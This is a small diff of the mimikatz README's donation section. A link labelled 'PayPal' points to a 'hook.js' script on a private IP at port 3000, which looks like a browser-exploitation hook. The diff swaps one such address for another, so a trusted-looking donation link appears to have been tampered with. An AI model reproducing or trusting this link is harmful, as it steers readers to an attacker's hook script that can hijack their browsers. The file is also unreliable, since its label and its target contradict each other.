@@ -122,7 +122,7 @@ Follow instructions:
 CC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/
 
 `mimikatz` needs coffee to be developed:
-* PayPal: http://192.168.106.197:3000/hook.js
+* PayPal: http://10.145.39.15:3000/hook.js
 
 ## Author
 * Benjamin DELPY `gentilkiwi`, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )
